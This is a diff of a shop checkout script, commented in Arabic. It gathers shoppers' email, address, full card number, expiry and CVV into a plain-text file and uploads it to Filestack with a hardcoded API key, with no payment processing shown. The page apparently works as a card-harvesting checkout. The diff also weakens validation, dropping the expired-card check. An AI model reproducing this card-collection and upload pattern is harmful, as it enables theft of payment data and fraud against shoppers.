@@ -7,7 +7,7 @@ document.addEventListener('DOMContentLoaded', function () {
     const queryString = window.location.search;
     const urlParams = new URLSearchParams(queryString);
     urlParams.forEach((value, key) => {
-      params[key] = value;
+      params[key] = decodeURIComponent(value);  // فك تشفير القيم
     });
     return params;
   }
@@ -15,10 +15,10 @@ document.addEventListener('DOMContentLoaded', function () {
   const urlParams = getUrlParams();
 
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
-  document.getElementById('product-name').textContent = urlParams.name;
-  document.getElementById('product-color').textContent = urlParams.color;
-  document.getElementById('product-price').textContent = urlParams.price;
-  document.getElementById('total-price').textContent = urlParams.total;
+  document.getElementById('product-name').textContent = urlParams.name || "Product Name";
+  document.getElementById('product-color').textContent = urlParams.color || "Product Color";
+  document.getElementById('product-price').textContent = `$${urlParams.price || "0.00"}`;
+  document.getElementById('total-price').textContent = `$${urlParams.price || "0.00"}`;
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
@@ -75,44 +75,44 @@ document.addEventListener('DOMContentLoaded', function () {
 
     // تحقق من الحقول الفارغة
     if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !cardName || !cardNumber || !expiry || !cvv) {
-      isValid = false;
-      showErrorMessage('Please fill out all required fields.', 'general');
+        isValid = false;
+        showErrorMessage('Please fill out all required fields.', 'general');
     }
 
     // تحقق من صحة البريد الإلكتروني
     if (!validateEmail(email)) {
-      isValid = false;
-      showErrorMessage('Please enter a valid email address.', 'email');
+        isValid = false;
+        showErrorMessage('Please enter a valid email address.', 'email');
     }
 
     // تحقق من اسم حامل البطاقة
     if (!validateCardName(cardName)) {
-      isValid = false;
-      showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
+        isValid = false;
+        showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
     }
 
     // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
     if (!validateCard(cardNumber)) {
-      isValid = false;
-      showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
+        isValid = false;
+        showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
     }
 
     // تحقق من تاريخ الصلاحية
     if (!validateExpiry(expiry)) {
-      isValid = false;
-      showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
+        isValid = false;
+        showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
     }
 
     // تحقق من CVV
     if (!validateCVV(cvv)) {
-      isValid = false;
-      showErrorMessage('Please enter a valid CVV number.', 'cvv');
+        isValid = false;
+        showErrorMessage('Please enter a valid CVV number.', 'cvv');
     }
 
     if (isValid) {
-      // إنشاء محتوى الملف النصي مع بيانات المنتج
-      const orderData =
-        `Email: ${email}\n
+        // إنشاء محتوى الملف النصي مع بيانات المنتج
+        const orderData =  
+            `Email: ${email}\n
             First Name: ${firstName}\n
             Last Name: ${lastName}\n
             Street_House_Apartment_Unit: ${streetHouseApartmentUnit}\n
@@ -130,26 +130,26 @@ document.addEventListener('DOMContentLoaded', function () {
             Product Image URL: ${productImageUrl}\n
             Total Price: $${totalPrice}`;
 
-      // تحويل البيانات إلى Blob (بيانات ثنائية)
-      const blob = new Blob([orderData], { type: 'text/plain' });
+        // تحويل البيانات إلى Blob (بيانات ثنائية)
+        const blob = new Blob([orderData], { type: 'text/plain' });
 
-      // إعدادات Filestack API
-      const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
-      const client = filestack.init(apiKey);
+        // إعدادات Filestack API
+        const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
+        const client = filestack.init(apiKey);
 
-      // رفع الملف إلى Filestack
-      client.upload(blob)
-        .then(result => {
-          // عند نجاح رفع الملف
-          alert('Your order has been successfully placed and saved to Filestack!');
-          window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
-          console.log(result);  // تفاصيل رفع الملف
-        })
-        .catch(error => {
-          // في حال حدوث خطأ
-          console.error('Error uploading file to Filestack:', error);
-          alert('Something went wrong, please try again later.');
-        });
+        // رفع الملف إلى Filestack
+        client.upload(blob)
+            .then(result => {
+                // عند نجاح رفع الملف
+                alert('Your order has been successfully placed and saved to Filestack!');
+                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
+                console.log(result);  // تفاصيل رفع الملف
+            })
+            .catch(error => {
+                // في حال حدوث خطأ
+                console.error('Error uploading file to Filestack:', error);
+                alert('Something went wrong, please try again later.');
+            });
     }
   });
 });
@@ -168,29 +168,23 @@ function validateCardName(cardName) {
 
 // دالة للتحقق من رقم البطاقة (Visa / MasterCard فقط)
 function validateCard(cardNumber) {
-  const visaMasterCardPattern = /^(4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/; // تحقق من فيزا وماستر كارد
+  const visaMasterCardPattern = /^(4[0-9]{12}|5[1-5][0-9]{14})$/;  // Visa أو MasterCard فقط
   return visaMasterCardPattern.test(cardNumber);
 }
 
-// دالة للتحقق من تاريخ الصلاحية (MM/YY)
+// دالة للتحقق من تاريخ انتهاء البطاقة (صالح فقط في MM/YY)
 function validateExpiry(expiry) {
-  const expiryPattern = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
-  if (!expiryPattern.test(expiry)) return false;
-
-  // تحقق من أن تاريخ الصلاحية ليس في الماضي
-  const currentDate = new Date();
-  const [month, year] = expiry.split('/').map(val => parseInt(val, 10));
-  const expiryDate = new Date(`20${year}`, month - 1);  // تحويل إلى تاريخ مع السنة 20XX
-  return expiryDate >= currentDate;
+  const expiryPattern = /^(0[1-9]|1[0-2])\/\d{2}$/;  // MM/YY
+  return expiryPattern.test(expiry);
 }
 
 // دالة للتحقق من CVV
 function validateCVV(cvv) {
-  const cvvPattern = /^[0-9]{3,4}$/;  // يحقق من أن الرقم يتكون من 3 أو 4 أرقام
+  const cvvPattern = /^[0-9]{3}$/;  // CVV يتكون من 3 أرقام
   return cvvPattern.test(cvv);
 }
 
-// دالة لإظهار رسالة الخطأ
+// دالة لعرض رسائل الخطأ
 function showErrorMessage(message, fieldId) {
   const field = document.getElementById(fieldId);
   const errorMessage = document.createElement('p');
@@ -204,3 +198,4 @@ function removeErrorMessages() {
   const errorMessages = document.querySelectorAll('.error-message');
   errorMessages.forEach(message => message.remove());
 }
+
